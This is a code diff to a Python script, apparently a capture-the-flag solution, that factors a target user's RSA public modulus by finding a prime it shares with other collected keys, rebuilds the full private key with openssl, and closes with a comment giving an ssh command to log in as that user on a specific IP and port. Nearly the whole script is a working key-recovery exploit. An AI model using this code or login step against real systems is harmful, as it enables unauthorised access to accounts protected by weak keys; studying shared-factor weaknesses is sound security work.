@@ -2,6 +2,21 @@ import os
 import base64
 
 DIR = "./evilcorppubkeys"
+USER = "shanaehudson"
+
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+
+def minv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception('modular inverse does not exist')
+    else:
+        return x % m
 
 def gcd(a, b):
 	if a > b:
@@ -23,7 +38,7 @@ def process_formated_key(key):
 	n = int(''.join(hexarr[offset:offset+n_size]), 16)
 	return (n, e)
 
-shanaehudson_key = None
+user_key = None
 
 files = [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(DIR)] for val in sublist]
 keys = []
@@ -35,26 +50,49 @@ for filename in files:
 	n, e = process_formated_key(key)
 	key = (n, e, user)
 	keys.append(key)
-	if user == "shanaehudson":
-		shanaehudson_key = key
-
+	if user == USER:
+		user_key = key
+	file.close()
 fact = []
 
 for key in keys:
-	n1 = shanaehudson_key[0]
+	n1 = user_key[0]
 	n2 = key[0]
 	g = gcd(n1, n2)
 	if g != 1 and g != n1 and g != n2:
 		fact.append(g)
 		# print("\n---\n".join(map(repr,[n1, n2, g])), "\n\n\n")
 
+n = user_key[0]
+e = user_key[1]
 p, q = fact
+phi = (p-1)*(q-1)
+d = minv(e, phi)
+e1 = d%(p-1)
+e2 = d%(q-1)
+coeff = minv(q, p)
 
+print(e,d,n,"\n\n")
 
-# for i in range(len(keys)):
-# 	for j in range(i+1,len(keys)):
-# 		ni = keys[i][0]
-# 		nj = keys[j][0]
-# 		g = gcd(ni, nj)
-# 		if g != 1 and g != ni and g != nj:
-# 			print("\n---\n".join(map(repr,[ni, nj, g])), "\n\n\n")
+s = f"""asn1=SEQUENCE:rsa_key
+
+[rsa_key]
+version=INTEGER:0
+modulus=INTEGER:{n}
+pubExp=INTEGER:{e}
+privExp=INTEGER:{d}
+p=INTEGER:{p}
+q=INTEGER:{q}
+e1=INTEGER:{e1}
+e2=INTEGER:{e2}
+coeff=INTEGER:{coeff}"""
+
+file = open("key_spec.txt", "w")
+file.write(s)
+file.close()
+
+os.system("openssl asn1parse -genconf key_spec.txt -out newkey.der")
+os.system("openssl rsa -in newkey.der -inform der -text -check")
+
+# Then save private key and use: 
+# >> ssh shanaehudson@52.49.91.111 -p 2222 -i rsa_priv.txt
